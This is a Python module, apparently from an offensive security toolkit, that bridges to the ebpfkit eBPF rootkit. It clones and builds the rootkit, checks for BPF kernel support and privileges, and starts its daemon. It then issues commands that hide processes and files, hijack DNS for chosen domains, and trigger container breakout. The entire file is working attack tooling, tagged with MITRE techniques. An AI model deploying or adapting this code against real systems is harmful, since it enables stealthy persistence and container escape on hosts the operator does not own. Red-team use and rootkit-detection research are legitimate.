"""Bridge for ebpfkit eBPF rootkit: container escape, process hiding, DNS hijack.

Source: https://github.com/Gui774ume/ebpfkit
License: Apache-2.0
SRC-ID: SRC-1034
Category: eBPF rootkit, container escape, process hiding, DNS hijacking, cloud/K8s
"""

import json
import os
import platform
import shutil
import subprocess
import sys
from datetime import datetime, UTC
from pathlib import Path
from typing import Any


MANIFEST = {
    "capability_id": "cloudxpl.k8s.ebpfkit_bridge.v1",
    "safety_class": "BRIDGE",
    "requires_authorization": True,
    "side_effects": [
        "loads_ebpf_programs",
        "hides_processes",
        "hides_files",
        "hijacks_dns",
        "container_breakout",
    ],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1014", "T1611"],
}

_REPO_URL = "https://github.com/Gui774ume/ebpfkit"

# ebpfkit capabilities that can be toggled at runtime
CAPABILITIES = [
    "hide_process",
    "hide_file",
    "dns_hijack",
    "network_discovery_block",
    "container_breakout",
    "pipe_prog_override",
    "http_pattern_inject",
    "docker_image_override",
    "k8s_dash_override",
]


def _save(args: Any, prefix: str, data: Any) -> str:
    out = getattr(args, "output", ".")
    os.makedirs(out, exist_ok=True)
    ts = datetime.now(UTC).strftime("%Y%m%d_%H%M%S")
    path = os.path.join(out, f"{prefix}_{ts}.json")
    with open(path, "w") as fh:
        json.dump(data, fh, indent=2, default=str)
    print(f"[+] Results saved to {path}")
    return path


def _check_kernel_bpf_support() -> dict[str, Any]:
    """Verify kernel version and BPF subsystem availability."""
    info: dict[str, Any] = {"kernel": platform.release(), "errors": []}

    bpf_helpers = Path("/sys/kernel/btf/vmlinux")
    if not bpf_helpers.exists():
        info["errors"].append("BTF vmlinux not found: kernel lacks CONFIG_DEBUG_INFO_BTF")

    bpf_dir = Path("/sys/fs/bpf")
    if not bpf_dir.is_dir():
        info["errors"].append("BPF filesystem not mounted at /sys/fs/bpf")

    # Check effective capabilities
    try:
        status = Path("/proc/self/status").read_text()
        for line in status.splitlines():
            if line.startswith("CapEff:"):
                cap_hex = int(line.split(":")[1].strip(), 16)
                cap_sys_admin = 1 << 21
                cap_bpf = 1 << 39
                if not (cap_hex & cap_sys_admin) and not (cap_hex & cap_bpf):
                    info["errors"].append(
                        "Missing CAP_SYS_ADMIN or CAP_BPF in effective capabilities"
                    )
                break
    except OSError:
        info["errors"].append("Could not read /proc/self/status for capability check")

    info["bpf_supported"] = len(info["errors"]) == 0
    return info


def _find_ebpfkit_binary(args: Any) -> str | None:
    """Locate the ebpfkit binary from PATH or user-specified location."""
    custom = getattr(args, "ebpfkit_path", None)
    if custom and os.path.isfile(custom) and os.access(custom, os.X_OK):
        return custom
    return shutil.which("ebpfkit")


def _find_ebpfkit_client(args: Any) -> str | None:
    """Locate the ebpfkit-client binary."""
    custom = getattr(args, "ebpfkit_client_path", None)
    if custom and os.path.isfile(custom) and os.access(custom, os.X_OK):
        return custom
    return shutil.which("ebpfkit-client")


def _build_from_source(args: Any) -> dict[str, Any]:
    """Clone and build ebpfkit from source if Go toolchain is available."""
    build_dir = getattr(args, "build_dir", "/tmp/ebpfkit-build")
    result: dict[str, Any] = {"success": False, "binary": None, "log": []}

    go_bin = shutil.which("go")
    if not go_bin:
        result["log"].append("Go toolchain not found; cannot build from source")
        return result

    make_bin = shutil.which("make")
    if not make_bin:
        result["log"].append("make not found; cannot build from source")
        return result

    os.makedirs(build_dir, exist_ok=True)
    src_dir = os.path.join(build_dir, "ebpfkit")

    if not os.path.isdir(src_dir):
        clone_cmd = ["git", "clone", "--depth", "1", _REPO_URL, src_dir]
        proc = subprocess.run(clone_cmd, capture_output=True, text=True, timeout=120)
        if proc.returncode != 0:
            result["log"].append(f"git clone failed: {proc.stderr.strip()}")
            return result
        result["log"].append("Repository cloned")

    build_cmd = [make_bin, "build"]
    proc = subprocess.run(
        build_cmd,
        capture_output=True,
        text=True,
        timeout=300,
        cwd=src_dir,
    )
    if proc.returncode != 0:
        result["log"].append(f"Build failed: {proc.stderr.strip()}")
        return result

    for candidate in [
        os.path.join(src_dir, "bin", "ebpfkit"),
        os.path.join(src_dir, "ebpfkit"),
    ]:
        if os.path.isfile(candidate):
            result["success"] = True
            result["binary"] = candidate
            result["log"].append(f"Build succeeded: {candidate}")
            return result

    result["log"].append("Build completed but binary not found in expected locations")
    return result


def _run_daemon(binary: str, args: Any) -> dict[str, Any]:
    """Start the ebpfkit daemon with specified options."""
    cmd = [binary]

    log_level = getattr(args, "log_level", "info")
    cmd.extend(["--log-level", log_level])

    iface = getattr(args, "interface", None)
    if iface:
        cmd.extend(["--iface", iface])

    target_container = getattr(args, "container_id", None)
    if target_container:
        cmd.extend(["--target-container", target_container])

    print(f"[*] Starting ebpfkit daemon: {' '.join(cmd)}")

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        # Read initial output to confirm startup
        import select

        ready, _, _ = select.select([proc.stdout], [], [], 5.0)
        startup_output = ""
        if ready:
            startup_output = proc.stdout.readline()

        return {
            "pid": proc.pid,
            "status": "running",
            "startup_output": startup_output.strip(),
            "command": " ".join(cmd),
        }
    except OSError as exc:
        return {"pid": None, "status": "failed", "error": str(exc)}


def _client_command(client_bin: str, action: str, params: dict[str, str]) -> dict[str, Any]:
    """Execute an ebpfkit-client command."""
    cmd = [client_bin, action]
    for key, val in params.items():
        cmd.extend([f"--{key}", val])

    print(f"[*] Client command: {' '.join(cmd)}")

    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        output = proc.stdout.strip()

        # Attempt JSON parse of output
        try:
            parsed = json.loads(output)
        except (json.JSONDecodeError, ValueError):
            parsed = {"raw_output": output}

        return {
            "action": action,
            "exit_code": proc.returncode,
            "output": parsed,
            "stderr": proc.stderr.strip() if proc.stderr else "",
        }
    except subprocess.TimeoutExpired:
        return {"action": action, "exit_code": -1, "error": "Command timed out"}
    except OSError as exc:
        return {"action": action, "exit_code": -1, "error": str(exc)}


def _get_status(client_bin: str) -> dict[str, Any]:
    """Query running ebpfkit daemon status via client."""
    return _client_command(client_bin, "status", {})


def _hide_process(client_bin: str, pid: int) -> dict[str, Any]:
    """Hide a process by PID."""
    return _client_command(client_bin, "hide-process", {"pid": str(pid)})


def _hide_file(client_bin: str, filepath: str) -> dict[str, Any]:
    """Hide a file from directory listings."""
    return _client_command(client_bin, "hide-file", {"path": filepath})


def _dns_hijack(client_bin: str, domain: str, target_ip: str) -> dict[str, Any]:
    """Configure DNS hijacking rule."""
    return _client_command(
        client_bin, "dns-hijack", {"domain": domain, "target": target_ip}
    )


def _container_breakout(client_bin: str, container_id: str) -> dict[str, Any]:
    """Trigger container breakout via eBPF program injection."""
    return _client_command(
        client_bin, "container-breakout", {"container": container_id}
    )


def run(args: Any) -> int:
    """Execute ebpfkit_bridge module.

    Supported actions (via args.action):
        check    - Verify prerequisites (kernel, BPF, binaries)
        build    - Build ebpfkit from source
        start    - Start the ebpfkit daemon
        status   - Query daemon status
        hide_pid - Hide a process by PID
        hide_file - Hide a file path
        dns      - Set up DNS hijack rule
        breakout - Container breakout via eBPF injection
    """
    action = getattr(args, "action", "check")
    print(f"[*] {MANIFEST['capability_id']} - ebpfkit eBPF rootkit bridge")
    print(f"[*] Action: {action}")

    results: dict[str, Any] = {
        "module": "ebpfkit_bridge",
        "action": action,
        "findings": [],
        "summary": {},
    }

    # Always check prerequisites first
    prereqs = _check_kernel_bpf_support()
    results["prerequisites"] = prereqs

    if action == "check":
        ebpfkit_bin = _find_ebpfkit_binary(args)
        client_bin = _find_ebpfkit_client(args)
        results["ebpfkit_binary"] = ebpfkit_bin
        results["ebpfkit_client"] = client_bin
        results["capabilities"] = CAPABILITIES
        results["status"] = "completed"

        if prereqs["bpf_supported"]:
            print("[+] Kernel BPF support verified")
        else:
            print(f"[-] BPF issues: {'; '.join(prereqs['errors'])}")

        if ebpfkit_bin:
            print(f"[+] ebpfkit binary: {ebpfkit_bin}")
        else:
            print("[!] ebpfkit binary not found; use 'build' action or set --ebpfkit-path")

        if client_bin:
            print(f"[+] ebpfkit-client binary: {client_bin}")
        else:
            print("[!] ebpfkit-client not found; set --ebpfkit-client-path")

        _save(args, "k8s_ebpfkit_check", results)
        return 0

    if action == "build":
        build_result = _build_from_source(args)
        results["build"] = build_result
        results["status"] = "completed" if build_result["success"] else "build_failed"
        for msg in build_result["log"]:
            print(f"[*] {msg}")
        _save(args, "k8s_ebpfkit_build", results)
        return 0 if build_result["success"] else 1

    # Actions that require running binaries
    if not prereqs["bpf_supported"]:
        print("[-] Cannot proceed: BPF prerequisites not met", file=sys.stderr)
        results["status"] = "prereq_failed"
        _save(args, "k8s_ebpfkit_error", results)
        return 1

    if action == "start":
        ebpfkit_bin = _find_ebpfkit_binary(args)
        if not ebpfkit_bin:
            print("[-] ebpfkit binary not found", file=sys.stderr)
            results["status"] = "binary_not_found"
            _save(args, "k8s_ebpfkit_error", results)
            return 1

        daemon_result = _run_daemon(ebpfkit_bin, args)
        results["daemon"] = daemon_result
        results["status"] = daemon_result["status"]
        if daemon_result["status"] == "running":
            print(f"[+] Daemon started with PID {daemon_result['pid']}")
        else:
            print(f"[-] Daemon failed: {daemon_result.get('error', 'unknown')}")
        _save(args, "k8s_ebpfkit_start", results)
        return 0 if daemon_result["status"] == "running" else 1

    # Client-based actions
    client_bin = _find_ebpfkit_client(args)
    if not client_bin:
        print("[-] ebpfkit-client binary not found", file=sys.stderr)
        results["status"] = "client_not_found"
        _save(args, "k8s_ebpfkit_error", results)
        return 1

    if action == "status":
        status_result = _get_status(client_bin)
        results["daemon_status"] = status_result
        results["status"] = "completed"
        print(f"[+] Status query: exit_code={status_result['exit_code']}")
        _save(args, "k8s_ebpfkit_status", results)
        return 0

    if action == "hide_pid":
        pid = getattr(args, "target_pid", None)
        if not pid:
            print("[-] --target-pid required for hide_pid action", file=sys.stderr)
            return 1
        hide_result = _hide_process(client_bin, int(pid))
        results["hide_process"] = hide_result
        results["status"] = "completed"
        results["findings"].append({
            "type": "process_hidden",
            "pid": pid,
            "mitre": "T1014",
        })
        print(f"[+] Process {pid} hide request sent")
        _save(args, "k8s_ebpfkit_hide", results)
        return 0

    if action == "hide_file":
        fpath = getattr(args, "target_file", None)
        if not fpath:
            print("[-] --target-file required for hide_file action", file=sys.stderr)
            return 1
        hide_result = _hide_file(client_bin, fpath)
        results["hide_file"] = hide_result
        results["status"] = "completed"
        results["findings"].append({
            "type": "file_hidden",
            "path": fpath,
            "mitre": "T1014",
        })
        print(f"[+] File hide request sent for {fpath}")
        _save(args, "k8s_ebpfkit_hidefile", results)
        return 0

    if action == "dns":
        domain = getattr(args, "domain", None)
        target_ip = getattr(args, "dns_target", None)
        if not domain or not target_ip:
            print("[-] --domain and --dns-target required", file=sys.stderr)
            return 1
        dns_result = _dns_hijack(client_bin, domain, target_ip)
        results["dns_hijack"] = dns_result
        results["status"] = "completed"
        results["findings"].append({
            "type": "dns_hijack_configured",
            "domain": domain,
            "target_ip": target_ip,
            "mitre": "T1071.004",
        })
        print(f"[+] DNS hijack: {domain} -> {target_ip}")
        _save(args, "k8s_ebpfkit_dns", results)
        return 0

    if action == "breakout":
        cid = getattr(args, "container_id", None)
        if not cid:
            print("[-] --container-id required for breakout action", file=sys.stderr)
            return 1
        breakout_result = _container_breakout(client_bin, cid)
        results["breakout"] = breakout_result
        results["status"] = "completed"
        results["findings"].append({
            "type": "container_breakout_attempted",
            "container_id": cid,
            "mitre": "T1611",
        })
        print(f"[+] Container breakout triggered for {cid}")
        _save(args, "k8s_ebpfkit_breakout", results)
        return 0

    print(f"[-] Unknown action: {action}", file=sys.stderr)
    results["status"] = "unknown_action"
    _save(args, "k8s_ebpfkit_error", results)
    return 1
